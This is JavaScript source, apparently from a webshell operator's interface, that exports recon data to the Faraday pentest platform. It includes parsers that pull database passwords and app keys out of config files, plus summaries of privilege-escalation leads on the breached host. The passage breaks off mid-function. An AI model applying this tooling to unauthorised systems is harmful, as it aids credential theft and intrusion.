// ==================== FARADAY EXPORT ====================
// Build a `faraday_json`-compatible JSON file from the data we've collected in
// IndexedDB (scans, scan_results) plus the last loaded diagnostics blob, and
// drop it in the operator's Downloads folder. They upload it via
// `faraday-cli tool report <file>` or by drag-dropping into the Faraday web
// UI. Export-only by design: no fetch, no token storage, no CORS surface.
// See claudedocs/design_faraday_export.md.

const FARADAY_LS_WORKSPACE = 'faraday.workspace';
const FARADAY_LS_USER      = 'faraday.user';

// Cached by diagnostics.js after each loadDiag() so the export can grab the
// freshest snapshot without re-running the recon scan.
window._lastDiagBlob = window._lastDiagBlob || null;

function _faradayCfg() {
  return {
    workspace: localStorage.getItem(FARADAY_LS_WORKSPACE) || '',
    user: localStorage.getItem(FARADAY_LS_USER) || 'operator',
  };
}

function faradaySaveSettings() {
  const ws = (document.getElementById('faraday-workspace').value || '').trim();
  const usr = (document.getElementById('faraday-user').value || '').trim() || 'operator';
  localStorage.setItem(FARADAY_LS_WORKSPACE, ws);
  localStorage.setItem(FARADAY_LS_USER, usr);
  const status = document.getElementById('faraday-save-status');
  if (status) {
    status.textContent = '✓ saved';
    status.style.color = 'var(--green)';
    setTimeout(() => { status.textContent = ''; }, 1500);
  }
}

function faradayLoadSettings() {
  // Populate the settings card inputs from localStorage on Diagnostics tab open.
  const c = _faradayCfg();
  const ws  = document.getElementById('faraday-workspace');
  const usr = document.getElementById('faraday-user');
  if (ws  && !ws.value)  ws.value  = c.workspace;
  if (usr && !usr.value) usr.value = c.user;
}

function faradayToggleSettings() {
  const panel = document.getElementById('faraday-settings-panel');
  if (!panel) return;
  const opening = panel.hasAttribute('hidden');
  if (opening) {
    panel.removeAttribute('hidden');
    faradayLoadSettings();
  } else {
    panel.setAttribute('hidden', '');
  }
  const toggle = document.querySelector('.split-btn-toggle');
  if (toggle) toggle.setAttribute('aria-expanded', opening ? 'true' : 'false');
}

function _faradayClosePanel() {
  const panel = document.getElementById('faraday-settings-panel');
  if (!panel || panel.hasAttribute('hidden')) return;
  panel.setAttribute('hidden', '');
  const toggle = document.querySelector('.split-btn-toggle');
  if (toggle) toggle.setAttribute('aria-expanded', 'false');
}

// Bind click-outside-to-close + Esc once, lazily. Idempotent.
function _faradayBindOutsideClose() {
  if (window._faradayOutsideBound) return;
  window._faradayOutsideBound = true;
  document.addEventListener('click', e => {
    const panel = document.getElementById('faraday-settings-panel');
    if (!panel || panel.hasAttribute('hidden')) return;
    if (panel.contains(e.target)) return;
    if (e.target.closest('.split-btn-toggle')) return; // toggle handles itself
    _faradayClosePanel();
  });
  document.addEventListener('keydown', e => {
    if (e.key === 'Escape') _faradayClosePanel();
  });
}

function _faradayRequireWorkspace() {
  const cfg = _faradayCfg();
  if (!cfg.workspace) {
    alert('Set a Faraday workspace name first (sidebar → Faraday export ▾).');
    // Open the sidebar settings panel and focus the workspace input
    const panel = document.getElementById('faraday-settings-panel');
    if (panel && panel.hasAttribute('hidden')) faradayToggleSettings();
    const ws = document.getElementById('faraday-workspace');
    if (ws) ws.focus();
    return null;
  }
  return cfg;
}

// =================== Payload builders ===================
// This export is recon data, not a pentest finding set. We never push
// Vulnerability entities — everything we know goes into descriptions,
// services, credentials, or hostnames. Faraday's Vulnerability view stays
// clean for actual testing work the operator does later.

function _faradayServiceFromScanResult(r) {
  const descParts = [];
  if (r.banner) descParts.push((r.banner || '').substring(0, 1024));
  if (r.tls) {
    const t = r.tls;
    descParts.push(
      '[TLS]' +
      (t.self_signed ? ' self-signed' : '') +
      '\nCN=' + (t.subject_cn || '') +
      '\nIssuer=' + (t.issuer_cn || '') + (t.issuer_org ? ' / ' + t.issuer_org : '') +
      '\nValid: ' + (t.valid_from || '') + ' → ' + (t.valid_to || '') +
      (t.sans && t.sans.length ? '\nSANs: ' + t.sans.join(', ') : '')
    );
  }
  // Only 'open' is ever persisted by scanner.php (closed/filtered counts
  // live in the per-scan summary, not the events file), so we hardcode
  // status here rather than mapping r.state.
  return {
    name: r.service || '',
    port: r.port,
    protocol: r.proto || 'tcp',
    status: 'open',
    version: r.version || '',
    description: descParts.join('\n\n'),
    vulnerabilities: [],
  };
}

// =================== Credential parsers ===================
// Each parser returns an array of {name, username, password, endpoint}
// records. Values are taken verbatim — no decoding of connection-string
// syntax, no unescaping. We rely on _faradayDedupCredentials to collapse
// duplicates emitted across parsers (e.g. wp-config.php parsed by both the
// generic credential_files block AND the frameworks block).

function _faradayParseEnvCredentials(path, content) {
  const creds = [];
  if (!content) return creds;
  for (const raw of content.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line || line.startsWith('#')) continue;
    const stripped = line.replace(/^export\s+/, '');
    const eq = stripped.indexOf('=');
    if (eq <= 0) continue;
    const key = stripped.slice(0, eq).trim();
    if (!/^[A-Za-z_][A-Za-z0-9_]*$/.test(key)) continue;
    let val = stripped.slice(eq + 1).trim();
    if (val.length >= 2 &&
        ((val.startsWith('"') && val.endsWith('"')) ||
         (val.startsWith("'") && val.endsWith("'")))) {
      val = val.slice(1, -1);
    }
    creds.push({ name: key, username: key, password: val, endpoint: path });
  }
  return creds;
}

// INI-style: my.cnf / debian.cnf. Looks for user / password / host / port
// under any section. We don't track sections — duplicate keys across
// [client] / [mysqld] just produce multiple identical creds which dedup'll fold.
function _faradayParseMyCnf(path, content) {
  const creds = [];
  if (!content) return creds;
  const fields = {};
  for (const raw of content.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line || line.startsWith('#') || line.startsWith(';') || line.startsWith('[')) continue;
    const eq = line.indexOf('=');
    if (eq <= 0) continue;
    const key = line.slice(0, eq).trim().toLowerCase();
    let val = line.slice(eq + 1).trim();
    if (val.length >= 2 &&
        ((val.startsWith('"') && val.endsWith('"')) ||
         (val.startsWith("'") && val.endsWith("'")))) {
      val = val.slice(1, -1);
    }
    if (['user', 'username', 'password', 'host', 'port', 'socket', 'database'].indexOf(key) !== -1) {
      fields[key] = val;
    }
  }
  if (fields.user || fields.username || fields.password) {
    creds.push({
      name: 'mysql @ ' + (fields.host || 'localhost') + (fields.port ? ':' + fields.port : ''),
      username: fields.user || fields.username || '',
      password: fields.password || '',
      endpoint: path,
    });
  }
  return creds;
}

// .pgpass: hostname:port:database:username:password (colon-separated, one per line).
function _faradayParsePgpass(path, content) {
  const creds = [];
  if (!content) return creds;
  for (const raw of content.split(/\r?\n/)) {
    const line = raw.trim();
    if (!line || line.startsWith('#')) continue;
    const parts = line.split(':');
    if (parts.length < 5) continue;
    const [host, port, db, user, pass] = parts;
    creds.push({
      name: 'postgres @ ' + (host === '*' ? 'any' : host) + (port === '*' ? '' : ':' + port) + (db === '*' ? '' : '/' + db),
      username: user || '',
      password: pass || '',
      endpoint: path,
    });
  }
  return creds;
}

// wp-config.php: DB_USER / DB_PASSWORD / DB_HOST / DB_NAME defines.
function _faradayParseWpConfig(path, content) {
  if (!content) return [];
  const grab = re => { const m = content.match(re); return m ? m[1] : ''; };
  const user = grab(/define\s*\(\s*['"]DB_USER['"]\s*,\s*['"]([^'"]*)/);
  const pass = grab(/define\s*\(\s*['"]DB_PASSWORD['"]\s*,\s*['"]([^'"]*)/);
  const host = grab(/define\s*\(\s*['"]DB_HOST['"]\s*,\s*['"]([^'"]*)/);
  const db   = grab(/define\s*\(\s*['"]DB_NAME['"]\s*,\s*['"]([^'"]*)/);
  if (!user && !pass) return [];
  return [{
    name: 'WordPress DB @ ' + (host || '?') + (db ? '/' + db : ''),
    username: user, password: pass, endpoint: path,
  }];
}

// Rails / Symfony YAML database config — extremely loose grep, not a real YAML parser.
function _faradayParseDbYaml(path, content) {
  if (!content) return [];
  const grab = re => { const m = content.match(re); return m ? m[1].trim().replace(/^['"]|['"]$/g, '') : ''; };
  const user = grab(/^\s*username\s*:\s*(.+)$/m);
  const pass = grab(/^\s*password\s*:\s*(.+)$/m);
  const host = grab(/^\s*host\s*:\s*(.+)$/m);
  const db   = grab(/^\s*database\s*:\s*(.+)$/m);
  if (!user && !pass) return [];
  return [{
    name: 'app DB @ ' + (host || 'localhost') + (db ? '/' + db : ''),
    username: user, password: pass, endpoint: path,
  }];
}

// Magento 2 env.php — 'username' => 'value', 'password' => 'value'
function _faradayParseMagentoEnv(path, content) {
  if (!content) return [];
  const grab = re => { const m = content.match(re); return m ? m[1] : ''; };
  const user = grab(/'username'\s*=>\s*'([^']*)/);
  const pass = grab(/'password'\s*=>\s*'([^']*)/);
  const host = grab(/'host'\s*=>\s*'([^']*)/);
  const db   = grab(/'dbname'\s*=>\s*'([^']*)/);
  if (!user && !pass) return [];
  return [{
    name: 'Magento DB @ ' + (host || 'localhost') + (db ? '/' + db : ''),
    username: user, password: pass, endpoint: path,
  }];
}

// Dispatch a credential_files entry to the right parser based on its filename.
function _faradayParseCredentialFile(path, content) {
  const lower = path.toLowerCase();
  if (lower.endsWith('.pgpass'))                            return _faradayParsePgpass(path, content);
  if (/\.my\.cnf$|\/debian\.cnf$/.test(lower))              return _faradayParseMyCnf(path, content);
  if (/wp-config\.php$/.test(lower))                        return _faradayParseWpConfig(path, content);
  if (/database\.ya?ml$|parameters\.ya?ml$/.test(lower))    return _faradayParseDbYaml(path, content);
  if (/app\/etc\/env\.php$|local\.xml$/.test(lower))        return _faradayParseMagentoEnv(path, content);
  // Fallback: try the env parser — picks up any KEY=value shape if the file
  // happens to be env-shaped (no harm if it returns nothing).
  return _faradayParseEnvCredentials(path, content);
}

// Pull pre-parsed db_* details out of diag.frameworks into Credentials. The
// PHP backend already grepped these from each framework's config — no need
// to re-parse the file content here. Dedup will collapse overlap with
// _faradayParseCredentialFile.
function _faradayFrameworkCredentials(frameworks) {
  const creds = [];
  (frameworks || []).forEach(fw => {
    const d = fw.details || {};
    const endpoint = fw.config_path || '';
    if (d.db_user || d.db_pass) {
      creds.push({
        name: (fw.name || 'framework') + ' DB @ ' + (d.db_host || 'localhost') + (d.db_name ? '/' + d.db_name : ''),
        username: d.db_user || '',
        password: d.db_pass || '',
        endpoint: endpoint,
      });
    }
    if (d.app_key) {
      creds.push({
        name: (fw.name || 'framework') + ' APP_KEY',
        username: 'APP_KEY',
        password: d.app_key,
        endpoint: endpoint,
      });
    }
    if (d.database_url) {
      // Symfony DATABASE_URL is itself a credential string — emit verbatim.
      creds.push({
        name: (fw.name || 'framework') + ' DATABASE_URL',
        username: 'DATABASE_URL',
        password: d.database_url,
        endpoint: endpoint,
      });
    }
  });
  return creds;
}

// Collapse duplicate credentials by (username, password, endpoint). The same
// .env imported via two scans, or wp-config.php found by both the generic
// credential_files block and the frameworks block, would otherwise stack
// identically — Faraday dedupes server-side but we keep the file lean.
function _faradayDedupCredentials(creds) {
  const seen = new Set();
  const out = [];
  for (const c of creds) {
    const k = (c.username || '') + '\x00' + (c.password || '') + '\x00' + (c.endpoint || '');
    if (seen.has(k)) continue;
    seen.add(k);
    out.push(c);
  }
  return out;
}

// Build host bundles from scan_results rows, merging per-IP across scans.
// We only export 'open' ports — scanner.php intentionally omits filtered /
// closed events from the JSONL persist (faraday.js followed that contract).
function _faradayHostsFromScanResults(rows) {
  const hosts = {};
  rows.filter(r => r.state === 'open').forEach(r => {
    if (!hosts[r.host]) hosts[r.host] = { ip: r.host, hostnames: [], mac: '', os: '', services: [], vulnerabilities: [], credentials: [] };
    const key = r.port + '/' + (r.proto || 'tcp');
    const existing = hosts[r.host].services.find(s => (s.port + '/' + s.protocol) === key);
    if (!existing) {
      hosts[r.host].services.push(_faradayServiceFromScanResult(r));
    } else {
      // Same port/proto seen again with potentially fresh banner/version —
      // merge rather than drop. A reverse proxy that rotates between
      // Apache/nginx, or a banner that surfaced TLS info only on a second
      // pass, would otherwise lose data.
      const fresh = _faradayServiceFromScanResult(r);
      if (fresh.version && !existing.version) existing.version = fresh.version;
      if (fresh.name && !existing.name) existing.name = fresh.name;
      if (fresh.description && existing.description.indexOf(fresh.description) === -1) {
        existing.description = (existing.description ? existing.description + '\n\n---\n' : '') + fresh.description;
      }
    }
    // TLS SANs become additional hostnames on the host — these are
    // searchable in Faraday's Host view, where they belong, instead of
    // being buried inside the service description string.
    if (r.tls && r.tls.sans && r.tls.sans.length) {
      r.tls.sans.forEach(san => {
        const clean = String(san).replace(/^\*\./, '');   // wildcard SANs aren't usable as hostnames
        if (clean && hosts[r.host].hostnames.indexOf(clean) === -1) {
          hosts[r.host].hostnames.push(clean);
        }
      });
    }
    if (r.tls && r.tls.subject_cn) {
      const cn = String(r.tls.subject_cn).replace(/^\*\./, '');
      if (cn && hosts[r.host].hostnames.indexOf(cn) === -1) hosts[r.host].hostnames.push(cn);
    }
  });
  return hosts;
}

// Merge ARP-derived MACs into hosts the payload already contains. Runs on
// every export so per-scan exports still get MAC addresses for the IPs in
// their scan. Doesn't add new hosts — _faradayApplyDiag does that.
function _faradayMergeArpMacs(hosts, diag) {
  if (!diag || !diag.arp_hosts) return 0;
  let merged = 0;
  diag.arp_hosts.forEach(a => {
    if (!a.ip || !a.mac || a.ip === '0.0.0.0') return;
    if (hosts[a.ip] && !hosts[a.ip].mac) { hosts[a.ip].mac = a.mac; merged++; }
  });
  return merged;
}

// Build a multi-line `host.description` that captures the full diag posture
// for the target host (the box where the webshell runs). Faraday renders
// description verbatim in the Host detail view — multi-line plain text fits.
function _faradayHostDescription(diag) {
  const lines = [];
  const push = (label, val) => { if (val !== undefined && val !== null && val !== '') lines.push(label.padEnd(22) + val); };

  lines.push('— SYSTEM —');
  push('Webshell path:',  diag.webshell_path);
  push('PHP:',            diag.php_version);
  push('Server software:', diag.server);
  push('OS:',             diag.os);
  push('CWD:',            diag.cwd);
  push('Disk:',           diag.disk_free ? ('free ' + Math.round(diag.disk_free / 1e6) + 'MB / total ' + Math.round(diag.disk_total / 1e6) + 'MB') : null);
  lines.push('');

  lines.push('— IDENTITY —');
  push('User:',           (diag.user_name || '?') + (diag.uid !== undefined ? ' (uid=' + diag.uid + ')' : ''));
  push('Group:',          (diag.group_name || '?') + (diag.gid !== undefined ? ' (gid=' + diag.gid + ')' : ''));
  push('Supplementary:',  diag.groups || null);
  lines.push('');

  lines.push('— PHP POSTURE —');
  push('disable_functions:', diag.disable_functions);
  push('open_basedir:',      diag.open_basedir);
  push('max_execution_time:', diag.max_execution_time);
  push('allow_url_fopen:',   diag.allow_url_fopen);
  push('sendmail_path:',     diag.sendmail_path);
  if (diag.container && diag.container.detected) {
    push('Container:',       (diag.container.type || 'detected') + (diag.container.hints && diag.container.hints.length ? ' (' + diag.container.hints.join('; ') + ')' : ''));
  }
  lines.push('');

  if ((diag.interpreters && diag.interpreters.length) || (diag.tools && diag.tools.length)) {
    lines.push('— CAPABILITIES —');
    if (diag.interpreters && diag.interpreters.length) push('Interpreters:', diag.interpreters.map(p => p.split('/').pop()).slice(0, 12).join(', '));
    if (diag.tools && diag.tools.length)               push('Tools:',        diag.tools.map(p => p.split('/').pop()).slice(0, 16).join(', '));
    lines.push('');
  }

  if (diag.panels && diag.panels.length) {
    lines.push('— DETECTED PANELS —');
    diag.panels.forEach(p => lines.push('  • ' + p));
    lines.push('');
  }

  if (diag.frameworks && diag.frameworks.length) {
    lines.push('— FRAMEWORKS —');
    diag.frameworks.forEach(fw => {
      lines.push('  • ' + (fw.name || '?') + (fw.version ? ' ' + fw.version : '') + (fw.config_path ? '  [' + fw.config_path + ']' : ''));
      const d = fw.details || {};
      // Surface non-credential details inline; db_* are extracted to Credentials.
      if (d.debug)        lines.push('      debug=' + d.debug);
      if (d.app_env)      lines.push('      env=' + d.app_env);
      if (d.admin_path)   lines.push('      admin=' + d.admin_path);
      if (d.table_prefix) lines.push('      table_prefix=' + d.table_prefix);
      if (d.plugins !== undefined) lines.push('      plugins=' + d.plugins + (d.themes !== undefined ? ' themes=' + d.themes : ''));
    });
    lines.push('');
  }

  if (diag.kernel_info) {
    lines.push('— KERNEL —');
    push('Release:', diag.kernel_info.release || diag.kernel_info.version);
    push('Arch:',    diag.kernel_info.arch);
    if (diag.kernel_info.aslr !== undefined && diag.kernel_info.aslr !== null && diag.kernel_info.aslr !== false) {
      const aslrMap = { '0': 'disabled', '1': 'conservative', '2': 'full' };
      push('ASLR:', aslrMap[String(diag.kernel_info.aslr)] || diag.kernel_info.aslr);
    }
    if (diag.security_modules) {
      const sm = [];
      if (diag.security_modules.selinux && diag.security_modules.selinux.present) {
        sm.push('SELinux=' + (diag.security_modules.selinux.enforcing === 1 ? 'enforcing' : (diag.security_modules.selinux.enforcing === 0 ? 'permissive' : 'present')));
      }
      if (diag.security_modules.apparmor && diag.security_modules.apparmor.present) {
        sm.push('AppArmor=' + (diag.security_modules.apparmor.profiles_count || 0) + ' profiles');
      }
      if (diag.security_modules.seccomp !== null && diag.security_modules.seccomp !== undefined) {
        const seccompMap = { 0: 'disabled', 1: 'strict', 2: 'filter' };
        sm.push('Seccomp=' + (seccompMap[diag.security_modules.seccomp] || diag.security_modules.seccomp));
      }
      if (sm.length) push('Security mods:', sm.join(', '));
    }
    lines.push('');
  }

  // Capabilities — highlight the dangerous ones the operator should look at first.
  if (diag.capabilities && diag.capabilities.CapEff) {
    const dangerous = new Set(['CAP_SETUID','CAP_SYS_ADMIN','CAP_DAC_OVERRIDE','CAP_DAC_READ_SEARCH','CAP_SYS_PTRACE','CAP_NET_RAW','CAP_SYS_MODULE','CAP_CHOWN','CAP_FOWNER','CAP_SETGID']);
    const eff = (diag.capabilities.CapEff.caps || []);
    const danger = eff.filter(c => dangerous.has(c));
    if (eff.length) {
      lines.push('— LINUX CAPABILITIES (effective) —');
      if (danger.length) lines.push('  ⚠ dangerous: ' + danger.join(', '));
      const safe = eff.filter(c => !dangerous.has(c));
      if (safe.length) lines.push('  other: ' + safe.join(', '));
      lines.push('');
    }
  }

  const exposureLines = [];
  if (diag.readable_files && diag.readable_files.length) {
    exposureLines.push('Readable sensitive files (' + diag.readable_files.length + '):');
    diag.readable_files.slice(0, 12).forEach(f => exposureLines.push('  • ' + f));
    if (diag.readable_files.length > 12) exposureLines.push('  (+' + (diag.readable_files.length - 12) + ' more)');
  }
  if (diag.suid_binaries && diag.suid_binaries.length) {
    // Highlight GTFOBins-known binaries — those are immediate privesc leads.
    const gtfo = diag.suid_binaries.filter(b => b && b.gtfobins);
    const other = diag.suid_binaries.filter(b => b && !b.gtfobins);
    exposureLines.push('SUID binaries (' + diag.suid_binaries.length + ', ' + gtfo.length + ' GTFOBins):');
    gtfo.slice(0, 16).forEach(b => exposureLines.push('  ⚠ ' + b.path + '  [GTFOBins]'));
    other.slice(0, Math.max(0, 16 - gtfo.length)).forEach(b => exposureLines.push('  • ' + (b.path || JSON.stringify(b))));
  }
  if (diag.group_memberships && Object.keys(diag.group_memberships).length) {
    exposureLines.push('Privileged group memberships:');
    Object.entries(diag.group_memberships).forEach(([g, members]) => {
      (members || []).forEach(m => { if (m) exposureLines.push('  • ' + m + ' ∈ ' + g); });
    });
  }
  if (exposureLines.length) {
    lines.push('— EXPOSURES —');
    lines.push.apply(lines, exposureLines);
    lines.push('');
  }

  // Privilege-escalation surface — sudoers, cron writable scripts, ld.so.preload,
  // writable systemd timers, NFS no_root_squash, dangerous docker socket.
  const privescLines = [];
  if (diag.sudo_config && diag.sudo_config.readable && diag.sudo_config.files) {
    const paths = Object.keys(diag.sudo_config.files);
    if (paths.length) {
      privescLines.push('Sudoers readable: ' + paths.join(', '));
      // Just show NOPASSWD lines from each file — full sudoers content can be huge.
      paths.forEach(p => {
        const content = diag.sudo_config.files[p] || '';
        content.split(/\r?\n/).forEach(l => {
          if (/NOPASSWD/i.test(l) && !l.trim().startsWith('#')) privescLines.push('  • ' + p + ': ' + l.trim());
        });
      });
    }
  }
  if (diag.cron_jobs && diag.cron_jobs.length) {
    const writableCronSources = diag.cron_jobs.filter(j => j.source_writable);
    const writableCronScripts = [];
    diag.cron_jobs.forEach(j => (j.writable_scripts || []).forEach(s => writableCronScripts.push(j.source + ' → ' + s)));
    if (writableCronSources.length) privescLines.push('Writable cron source files: ' + writableCronSources.map(j => j.source).join(', '));
    if (writableCronScripts.length) {
      privescLines.push('Writable cron-invoked scripts:');
      writableCronScripts.forEach(w => privescLines.push('  • ' + w));
    }
  }
  if (diag.ld_preload) {
    const lp = diag.ld_preload;
    if (lp.writable) privescLines.push('/etc/ld.so.preload is WRITABLE — global library injection vector');
    else if (lp.content) privescLines.push('/etc/ld.so.preload set: ' + lp.content.trim().slice(0, 200));
    if (lp.env_value) privescLines.push('LD_PRELOAD env: ' + lp.env_value);
  }
  if (diag.systemd_timers && diag.systemd_timers.length) {
    const wt = diag.systemd_timers.filter(t => t.timer_writable || t.exec_writable);
    if (wt.length) {
      privescLines.push('Writable systemd timer chain:');
      wt.forEach(t => privescLines.push('  • ' + t.timer_path + (t.timer_writable ? ' [timer writable]' : '') + (t.exec_writable ? ' [exec writable: ' + t.exec_start + ']' : '')));
    }
  }
  if (diag.nfs_exports && diag.nfs_exports.no_root_squash && diag.nfs_exports.no_root_squash.length) {
    privescLines.push('NFS no_root_squash exports:');
    diag.nfs_exports.no_root_squash.forEach(e => privescLines.push('  ⚠ ' + e));
  }
  if (diag.docker_socket && diag.docker_socket.sockets && diag.docker_socket.sockets.length) {
    diag.docker_socket.sockets.forEach(s => {
      if (s.writable) privescLines.push('⚠ Docker/Podman socket WRITABLE: ' + s.path + ' (== root)');
      else if (s.readable) privescLines.push('Docker/Podman socket readable: ' + s.path);
    });
  }
  if (privescLines.length) {
    lines.push('— PRIVESC SURFACE —');
    lines.push.apply(lines, privescLines);
    lines.push('');
  }

  // Backup files: .bak / .sql / .sql.gz / wp-config.php.bak etc.
  if (diag.backup_files && diag.backup_files.length) {
    lines.push('— BACKUP FILES —');
    diag.backup_files.slice(0, 20).forEach(b => {
      lines.push('  • ' + b.path + (b.size ? ' (' + Math.round(b.size / 1024) + ' KB)' : '') + (b.readable ? '' : ' [unreadable]'));
    });
    if (diag.backup_files.length > 20) lines.push('  (+' + (diag.backup_files.length - 20) + ' more)');
    lines.push('');
  }

  // Mounts with relevant flags — nosuid/noexec/ro tell the operator what
  // they can or can't drop payloads to. Skip noisy pseudo-fs.
  if (diag.mounts && diag.mounts.length) {
    const interesting = diag.mounts.filter(m => {
      if (!m || !m.mountpoint) return false;
      if (/^(proc|sysfs|cgroup|cgroup2|tmpfs|devtmpfs|devpts|mqueue|pstore|bpf|tracefs|debugfs|securityfs|fusectl|hugetlbfs|configfs|autofs|rpc_pipefs|nsfs|binfmt_misc)$/.test(m.fstype || '')) return false;
      return true;
    });
    if (interesting.length) {
      lines.push('— MOUNTS —');
      interesting.slice(0, 20).forEach(m => {
        const flags = [];
        if (m.nosuid) flags.push('nosuid');
        if (m.noexec) flags.push('noexec');
        if (!m.writable) flags.push('ro');
        lines.push('  • ' + m.mountpoint + '  ' + (m.fstype || '') + (flags.length ? '  [' + flags.join(',') + ']' : ''));
      });
      lines.push('');
    }
  }

  // Routes — just default route + a couple of others, so the operator knows
  // the gateway / next-hop without scrolling through every interface route.
  if (diag.routes && diag.routes.length) {
    const def = diag.routes.find(r => r.dest === '0.0.0.0');
    if (def) {
      lines.push('— ROUTING —');
      lines.push('  default via ' + def.gw + ' dev ' + def.iface);
      // Show a few additional routes for situational awareness
      diag.routes.filter(r => r.dest !== '0.0.0.0').slice(0, 4).forEach(r => {
        lines.push('  ' + r.dest + '/' + r.mask + ' via ' + (r.gw === '0.0.0.0' ? 'direct' : r.gw) + ' dev ' + r.iface);
      });
      lines.push('');
    }
  }

  // Credentials: list the files that contributed without pasting raw values.
  // Combines .env files (env-style) and credential_files (multi-format) so
  // the operator can audit provenance.
  const credPaths = [];
  if (diag.env_files) credPaths.push.apply(credPaths, Object.keys(diag.env_files));
  if (diag.credential_files) credPaths.push.apply(credPaths, Object.keys(diag.credential_files));
  if (credPaths.length) {
    lines.push('— CREDENTIAL SOURCES (parsed into credentials) —');
    Array.from(new Set(credPaths)).sort().forEach(p => lines.push('  • ' + p));
    lines.push('');
  }

  lines.push('— BUILD —');
  push('Webshell build:', (typeof __BUILD !== 'undefined' && __BUILD.short_id) ? __BUILD.short_id : null);
  push('Exported at:',    new Date().toISOString());

  return lines.join('\n');
}

// Merge diagnostics-derived facts into the host bundle for the target itself,
// plus add any ARP-discovered hosts as their own bundles.
function _faradayApplyDiag(hosts, diag) {
  if (!diag) return;
  const targetIp = diag.target_ip || '';
  const targetHost = diag.target_host || '';

  // Ensure target host bundle exists
  let t = null;
  if (targetIp) {
    if (!hosts[targetIp]) hosts[targetIp] = { ip: targetIp, hostnames: targetHost ? [targetHost] : [], mac: '', os: diag.os || '', services: [], vulnerabilities: [], credentials: [] };
    t = hosts[targetIp];
    if (targetHost && t.hostnames.indexOf(targetHost) === -1) t.hostnames.push(targetHost);
    if (!t.os && diag.os) t.os = diag.os;
    // Rich diagnostic snapshot becomes the host description — gives the
    // operator a one-glance posture summary in Faraday's Host detail view.
    t.description = _faradayHostDescription(diag);
  }

  if (t) {
    // Credentials from three sources: .env files (env-style), credential_files
    // (multi-format: my.cnf, .pgpass, wp-config.php, database.yml, env.php),
    // and framework details (db_user/db_pass already structured by diag.php).
    // All three can overlap — dedup at the end by (username, password, endpoint).
    const collected = [];
    Object.entries(diag.env_files || {}).forEach(([path, content]) => {
      collected.push.apply(collected, _faradayParseEnvCredentials(path, content));
    });
    Object.entries(diag.credential_files || {}).forEach(([path, content]) => {
      collected.push.apply(collected, _faradayParseCredentialFile(path, content));
    });
    collected.push.apply(collected, _faradayFrameworkCredentials(diag.frameworks));
    _faradayDedupCredentials(collected).forEach(c => t.credentials.push(c));

    // Listening ports on the target become Services on the target host.
    // Skip loopback-only bindings (127.0.0.1:xxxx, ::1) — those are not
    // network-reachable and just pollute the Faraday Services view with
    // PHP-FPM / Redis / memcached internal sockets. The `loopback` flag
    // comes from the diag.php parser; older blobs without it default to
    // network-reachable so we don't regress against an old backend.
    (diag.open_ports || []).forEach(entry => {
      const isObj = typeof entry === 'object' && entry !== null;
      if (isObj && entry.loopback === true) return;
      const portNum = isObj ? entry.port : entry;
      const port = parseInt(portNum, 10);
      if (!Number.isFinite(port) || port <= 0) return;
      const key = port + '/tcp';
      if (t.services.some(s => (s.port + '/' + s.protocol) === key)) return;
      const procInfo = (isObj && entry.cmd)
        ? ' (pid ' + (entry.pid || '?') + ': ' + entry.cmd + (entry.uid !== undefined ? ', uid=' + entry.uid : '') + ')'
        : '';
      const bindInfo = (isObj && entry.local_addr && entry.local_addr !== '?')
        ? ' bound to ' + entry.local_addr
        : '';
      t.services.push({
        name: '', port: port, protocol: 'tcp', status: 'open',
        version: '', description: 'Listening on shell host' + bindInfo + procInfo,
        vulnerabilities: [],
      });
    });
  }

  // ARP hosts → additional Host bundles (with MAC). Try to resolve a
  // hostname from /etc/hosts via the diag blob if we have it (we don't right
  // now — diag.php doesn't read /etc/hosts), so ARP-only hosts remain
  // hostname-less. Documented gap; can be wired later if diag exposes a
  // hosts-file map.
  (diag.arp_hosts || []).forEach(a => {
    if (!a.ip || a.ip === '0.0.0.0') return;
    if (!hosts[a.ip]) hosts[a.ip] = { ip: a.ip, hostnames: [], mac: a.mac || '', os: '', services: [], vulnerabilities: [], credentials: [] };
    else if (!hosts[a.ip].mac && a.mac) hosts[a.ip].mac = a.mac;
  });
}

// =================== Top-level builders ===================

// Backend diag fetch + cache. Runs on every export so MAC merge, ARP-only
// hosts, and the target-host description never silently disappear just
// because the operator hasn't opened the Diagnostics tab yet. Best-effort:
// if the backend errors we proceed without enrichment instead of failing
// the export.
function _faradayEnsureDiag(force) {
  if (window._diagInFlight) return window._diagInFlight;
  if (!force && window._lastDiagBlob) return Promise.resolve();
  const fd = new FormData();
  fd.append('action', 'diag');
  window._diagInFlight = fetchJSON(fd).then(d => {
    if (d && !d.error) window._lastDiagBlob = d;
  }).catch(err => {
    console.warn('faraday: diag fetch failed, exporting without enrichment:', err);
  }).finally(() => { window._diagInFlight = null; });
  return window._diagInFlight;
}

function faradayBuildPayload(opts) {
  opts = opts || {};
  const cfg = _faradayCfg();
  const t0 = new Date();

  return _faradayEnsureDiag(opts.forceDiag).then(() => dbOpen().then(db => new Promise((res, rej) => {
    const tx = db.transaction(['scans', 'scan_results'], 'readonly');
    const scansReq = tx.objectStore('scans').getAll();
    const resultsReq = tx.objectStore('scan_results').getAll();
    let scans = [];
    let results = [];
    scansReq.onsuccess = e => { scans = e.target.result || []; };
    resultsReq.onsuccess = e => { results = e.target.result || []; };
    tx.oncomplete = () => res({ scans, results });
    tx.onerror = e => rej(e.target.error);
  }))).then(({ scans: allScans, results: allResults }) => {
    const scans = opts.scanIds
      ? allScans.filter(s => opts.scanIds.indexOf(s.id) !== -1)
      : (opts.includeAll ? allScans : []);
    const results = opts.scanIds
      ? allResults.filter(r => opts.scanIds.indexOf(r.scan_id) !== -1)
      : (opts.includeAll ? allResults : []);
    const hosts = _faradayHostsFromScanResults(results);
    // Always merge MACs from the diagnostics ARP cache into any host the
    // payload already contains — this is cheap, useful, and works for
    // per-scan exports too. Only add ARP-only hosts + diag findings when
    // the user explicitly asked for diag/full export.
    const diagBlob = window._lastDiagBlob || null;
    _faradayMergeArpMacs(hosts, diagBlob);
    if (opts.includeDiag || opts.includeAll) _faradayApplyDiag(hosts, diagBlob);

    const hostArr = Object.values(hosts);
    const t1 = new Date();
    const params = (opts.scanIds ? 'scan_ids=' + opts.scanIds.join(',') + ' ' : '') +
                   (opts.includeAll ? 'include_all=1 ' : '') +
                   (opts.includeDiag ? 'include_diag=1 ' : '') +
                   (typeof __BUILD !== 'undefined' && __BUILD.short_id ? 'build=' + __BUILD.short_id : '');

    return {
      command: {
        tool: 'shells-x-webshell',
        command: opts.scanIds ? 'scan_export' : (opts.includeAll ? 'full_export' : 'diag_export'),
        user: cfg.user,
        hostname: location.host,
